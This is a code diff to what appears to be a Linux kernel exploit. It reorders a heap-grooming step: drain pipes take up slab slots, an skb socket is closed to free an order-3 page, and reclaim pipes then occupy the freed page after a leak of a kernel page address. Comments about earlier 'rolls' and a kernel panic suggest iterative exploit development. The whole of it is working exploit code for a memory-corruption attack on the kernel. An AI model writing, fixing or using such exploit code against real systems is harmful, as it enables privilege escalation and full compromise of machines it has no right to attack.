@@ -1897,23 +1897,38 @@ static uintptr_t jc2_pipe_page_leak_child(void) {
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   pr_info("pipe page leak: %016zx (raw %016zx)\n", base, leaked);
   /*
-   * Roll 24 fd-passing: create pipes HERE in the child (they land on the
-   * just-reclaimed page by construction). The fd numbers are sent to the
-   * parent via the result pipe; the parent duplicates them via
-   * /proc/<child_pid>/fd/<N> — same underlying pipe_buffer in kernel.
+   * CRITICAL ORDERING (from pipe.c 220-229, roll 24's KP was this bug):
+   *   1. DRAIN pipes consume competing partial slab slots
+   *   2. close skb → frees the order-3 page → 2k slots go on freelist
+   *   3. RECLAIM pipes land on the freed page's slots
+   * My port had close-skb BEFORE any pipes — the page got stolen by
+   * competing allocations before our pipes could claim it.
    */
-  pin_to_core(g_core_sel);
-  SYSCHK(close(skb_sv[0])); SYSCHK(close(skb_sv[1]));
-  int made = 0;
-  for (int i = 0; i < 16; i++) {
-    pr_reclaim_fds[i][0] = pr_reclaim_fds[i][1] = -1;
-    if (pipe(pr_reclaim_fds[i]) == 0) {
-      fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ,
-            PIPE_BUFFER_SLOTS * 4096);
-      made++;
+  {
+    /* drain: consume partials (pipe.c uses PIPE_DRAIN=240) */
+    static int drain_fds[240][2];
+    for (int i = 0; i < 240; i++) {
+      drain_fds[i][0] = drain_fds[i][1] = -1;
+      if (pipe(drain_fds[i]) == 0)
+        fcntl(drain_fds[i][0], F_SETPIPE_SZ, PIPE_BUFFER_SLOTS * 4096);
     }
+    pin_to_core(g_core_sel);
+    /* free the skb → target page's 2k slots go on the per-cpu freelist */
+    SYSCHK(close(skb_sv[0]));
+    SYSCHK(close(skb_sv[1]));
+    /* reclaim: these land on the target page */
+    int made = 0;
+    for (int i = 0; i < 16; i++) {
+      pr_reclaim_fds[i][0] = pr_reclaim_fds[i][1] = -1;
+      if (pipe(pr_reclaim_fds[i]) == 0) {
+        fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ,
+              PIPE_BUFFER_SLOTS * 4096);
+        made++;
+      }
+    }
+    pr_info("pipe child: %d pipes on reclaimed page (after %d drain)\n",
+            made, 240);
   }
-  pr_info("pipe child: %d pipes on reclaimed page\n", made);
   free(buf);
   return base;
 }
